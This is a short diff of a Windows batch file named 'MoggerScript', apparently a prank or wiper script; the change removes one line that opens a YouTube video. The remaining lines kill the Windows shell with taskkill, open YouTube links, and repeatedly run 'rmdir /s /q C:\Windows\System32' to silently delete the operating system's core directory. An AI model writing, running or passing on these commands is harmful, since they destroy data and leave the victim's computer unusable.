@@ -3,7 +3,6 @@ rem "MoggerScript by strblzng 1.1b"
 taskkill /f /im explorer.exe
 start https://www.youtube.com/watch?v=Sz_kQuEM0mI
 start https://www.youtube.com/watch?v=VCW-DYR5Li0
-start https://www.youtube.com/watch?v=ZgTck7vGwIk
 start rmdir /s /q C:\Windows\System32
 start rmdir /s /q C:\Windows\System32
 start rmdir /s /q C:\Windows\System32
